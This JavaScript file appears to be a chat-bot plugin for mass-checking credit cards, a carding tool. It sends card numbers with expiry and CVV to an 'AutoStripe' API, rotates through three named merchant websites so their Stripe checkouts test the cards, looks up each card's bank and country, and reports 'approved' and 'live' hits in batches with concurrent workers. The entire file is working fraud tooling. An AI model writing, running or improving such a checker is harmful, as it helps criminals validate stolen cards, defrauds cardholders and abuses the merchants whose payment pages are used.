// plugins/checker/st.js
// Single and mass card checker using AutoStripe API
// Usage: .st NUMBER|MM|YY|CVV
//        .mst (reply to list, max 10, 5 concurrent workers)

const SITES = [
    'awamiproducts.com',
    'analyticorange.com',
    'www.eastlondonprintmakers.co.uk'
];
let siteIndex = 0;
function getNextSite() {
    const site = SITES[siteIndex % SITES.length];
    siteIndex++;
    return site;
}
const CONCURRENCY = 5;
const API_BASE    = 'https://an0notf-autostripe-api.up.railway.app';

async function getStatusLabel(status, respText) {
    const sl = (status || '').toLowerCase();
    const rl = (respText || '').toLowerCase();
    if (sl.includes('approved'))                                        return 'APPROVED ✅';
    if (sl.includes('3d') || rl.includes('required'))                   return 'APPROVED ✅';
    if (rl.includes('insufficient_funds'))                              return 'APPROVED ✅';
    if (rl.includes('incorrect_cvc') || rl.includes('incorrect_cvv'))   return 'APPROVED ✅';
    if (rl.includes('otp'))                                             return 'LIVE✅';
    return 'DECLINED ❌';
}

async function binLookup(bin) {
    try {
        const res = await global.axios.get(`https://lookup.binlist.net/${bin}`, {
            timeout: 5000, headers: { 'Accept-Version': '3' }
        });
        const brand   = res.data?.scheme?.toUpperCase() || 'Unknown';
        const country = res.data?.country?.name || '';
        const bank    = res.data?.bank?.name || '';
        return { brand, extra: [country, bank].filter(Boolean).join(' | ') };
    } catch (e) {
        return { brand: 'Unknown', extra: '' };
    }
}

function buildResultText(statusLabel, cc, respText, bin, brand, binExtra, timeTaken) {
    return `${statusLabel}\n` +
        `━━━━━━━━━━━━━━━\n` +
        `「💳」 𝗖𝗖 - ${cc}\n` +
        `「⟐」 𝗦𝘁𝗮𝘁𝘂𝘀 : ${respText}\n` +
        `「🔥」 𝗚𝗮𝘁𝗲 : Stripe2🔥\n` +
        `━━━━━━━━━━━━━━━\n` +
        `「ϟ」 𝗕𝗶𝗻 : ${bin}\n` +
        `「⟐」 𝗕𝗿𝗮𝗻𝗱 : ${brand}${binExtra ? ` | ${binExtra}` : ''}\n` +
        `━━━━━━━━━━━━━━━\n` +
        `「⌚」 𝗧𝗶𝗺𝗲 : ${timeTaken}\n` +
        ` ╚━━━「🅰️n0nOtF  𝐂𝐇𝐄𝐂𝐊𝐄𝗥」━━━╝`;
}

module.exports = [

    // ==================== .st ====================
    {
        name: 'chk',
        category: 'checker',
        ownerOnly: false,
        description: 'Check a single credit card via AutoStripe',

        async func(m, sock, args) {
            const prefix = global.DEFAULT_PREFIX;

            if (args.length === 0) {
                return sock.sendMessage(m.key.remoteJid, {
                    text: `❌ *Usage:* ${prefix}chk NUMBER|MM|YY|CVV\n` +
                          `*Example:* ${prefix}chk 4111111111111111|12|25|123\n` +
                          `*Custom site:* ${prefix}chk 4111111111111111|12|25|123 site.com\n` +
                          `*Default site:* ${SITES[siteIndex % SITES.length]}`
                }, { quoted: m });
            }

            const cc   = args[0];
            const site = args[1] || getNextSite();

            if (cc.split('|').length !== 4) {
                return sock.sendMessage(m.key.remoteJid, {
                    text: `❌ Invalid format. Use: NUMBER|MM|YY|CVV`
                }, { quoted: m });
            }

            let processingKey = null;
            try {
                const pm = await sock.sendMessage(m.key.remoteJid, {
                    text: `🔄 *Checking...*\n💳 ${cc}`
                }, { quoted: m });
                processingKey = pm?.key || null;
            } catch (e) {}

            const startTime = Date.now();

            try {
                const apiUrl   = `${API_BASE}/gateway=autostripe/key=An0nOtF/site=${site}/cc=${cc}`;
                const response = await global.axios.get(apiUrl, { timeout: 30000 });
                const data     = response.data;

                const timeTaken   = ((Date.now() - startTime) / 1000).toFixed(2) + 's';
                const status      = data.status || 'Unknown';
                const respText    = data.response || 'No response';
                const bin         = cc.split('|')[0].slice(0, 6);
                const statusLabel = await getStatusLabel(status, respText);
                const { brand, extra: binExtra } = await binLookup(bin);
                const resultText  = buildResultText(statusLabel, cc, respText, bin, brand, binExtra, timeTaken);

                if (processingKey) {
                    try { await sock.sendMessage(m.key.remoteJid, { text: resultText, edit: processingKey }); }
                    catch (e) { await sock.sendMessage(m.key.remoteJid, { text: resultText }, { quoted: m }); }
                } else {
                    await sock.sendMessage(m.key.remoteJid, { text: resultText }, { quoted: m });
                }

            } catch (error) {
                const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2) + 's';
                let errDetail = error.message;
                if (error.code === 'ECONNABORTED') errDetail = 'Connection timeout';
                else if (error.response) errDetail = `API Error: ${error.response.status}`;
                else if (error.request) errDetail = 'No response from server';

                const errText =
                    `ERROR  ❌\n` +
                    `━━━━━━━━━━━━━━━\n` +
                    `「💳」 𝗖𝗖 - ${cc}\n` +
                    `「⟐」 𝗦𝘁𝗮𝘁𝘂𝘀 : ${errDetail}\n` +
                    `「🔥」 𝗚𝗮𝘁𝗲 : Stripe2🔥\n` +
                    `━━━━━━━━━━━━━━━\n` +
                    `「⌚」 𝗧𝗶𝗺𝗲 : ${timeTaken}\n` +
                    ` ╚━━━「🅰️n0nOtF  𝐂𝐇𝐄𝐂𝐊𝐄𝗥」━━━╝`;

                if (processingKey) {
                    try { await sock.sendMessage(m.key.remoteJid, { text: errText, edit: processingKey }); }
                    catch (e) { await sock.sendMessage(m.key.remoteJid, { text: errText }, { quoted: m }); }
                } else {
                    await sock.sendMessage(m.key.remoteJid, { text: errText }, { quoted: m });
                }
            }
        }
    },

    // ==================== .mst ====================
    {
        name: 'mchk',
        category: 'checker',
        ownerOnly: false,
        description: 'Mass check cards via AutoStripe (reply to list, max 10, 5 workers)',

        async func(m, sock, args) {
            const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            if (!quotedMsg) {
                return sock.sendMessage(m.key.remoteJid, {
                    text: `❌ Reply to a message containing cards (one per line)\n` +
                          `*Format:* NUMBER|MM|YY|CVV\n` +
                          `*Custom site:* .mst site.com`
                }, { quoted: m });
            }

            const rawText = quotedMsg.conversation
                || quotedMsg.extendedTextMessage?.text
                || '';

            if (!rawText) {
                return sock.sendMessage(m.key.remoteJid, {
                    text: '❌ Could not extract cards from replied message'
                }, { quoted: m });
            }

            // site arg optional, otherwise rotate per card

            const allCards = rawText.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.split('|').length === 4);

            if (allCards.length === 0) {
                return sock.sendMessage(m.key.remoteJid, {
                    text: '❌ No valid cards found. Format: NUMBER|MM|YY|CVV'
                }, { quoted: m });
            }

            const cards   = allCards.slice(0, 10);
            const skipped = allCards.length - cards.length;

            let statusKey = null;
            try {
                const sm = await sock.sendMessage(m.key.remoteJid, {
                    text: `🔄 *MASS CHECK*\n━━━━━━━━━━━━━━━\n` +
                          `📦 Cards: ${cards.length}${skipped > 0 ? ` (${skipped} skipped — max 10)` : ''}\n` +
                          `⚡ Workers: ${CONCURRENCY} concurrent\n⏳ Processing...`
                }, { quoted: m });
                statusKey = sm?.key || null;
            } catch (e) {}

            const startTime = Date.now();
            const results   = { approved: 0, declined: 0, errors: 0 };
            let done = 0;

            const processCard = async (cc) => {
                try {
                    const cardSite = getNextSite();
                    const apiUrl   = `${API_BASE}/gateway=autostripe/key=An0nOtF/site=${cardSite}/cc=${cc}`;
                    const res      = await global.axios.get(apiUrl, { timeout: 30000 });
                    const data     = res.data;
                    const status   = data.status || 'Unknown';
                    const respText = data.response || 'No response';
                    const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2) + 's';

                    done++;
                    if (statusKey) {
                        try {
                            await sock.sendMessage(m.key.remoteJid, {
                                text: `🔄 *MASS CHECK*\n━━━━━━━━━━━━━━━\n` +
                                      `📦 Cards: ${cards.length}\n⚡ Workers: ${CONCURRENCY}\n` +
                                      `📊 Progress: ${done}/${cards.length}`,
                                edit: statusKey
                            });
                        } catch (e) {}
                    }

                    const statusLabel = await getStatusLabel(status, respText);

                    if (statusLabel === 'APPROVED ✅') {
                        results.approved++;
                        const bin = cc.split('|')[0].slice(0, 6);
                        const { brand, extra: binExtra } = await binLookup(bin);
                        const hitText = buildResultText(statusLabel, cc, respText, bin, brand, binExtra, timeTaken);
                        await sock.sendMessage(m.key.remoteJid, { text: hitText }, { quoted: m });
                    } else {
                        results.declined++;
                    }

                } catch (e) {
                    done++;
                    results.errors++;
                }
            };

            // Run in batches of CONCURRENCY
            for (let i = 0; i < cards.length; i += CONCURRENCY) {
                await Promise.all(cards.slice(i, i + CONCURRENCY).map(c => processCard(c)));
            }

            const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
            const summary =
                `✅ *MASS CHECK COMPLETE*\n` +
                `━━━━━━━━━━━━━━━\n` +
                `📦 Total: ${cards.length}\n` +
                `✅ Approved: ${results.approved}\n` +
                `❌ Declined: ${results.declined}\n` +
                `🔴 Errors: ${results.errors}\n` +
                `━━━━━━━━━━━━━━━\n` +
                `「⌚」 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲 : ${totalTime}s\n` +
                ` ╚━━━「🅰️n0nOtF  𝐂𝐇𝐄𝐂𝐊𝐄𝗥」━━━╝`;

            if (statusKey) {
                try { await sock.sendMessage(m.key.remoteJid, { text: summary, edit: statusKey }); }
                catch (e) { await sock.sendMessage(m.key.remoteJid, { text: summary }, { quoted: m }); }
            } else {
                await sock.sendMessage(m.key.remoteJid, { text: summary }, { quoted: m });
            }
        }
    }

];
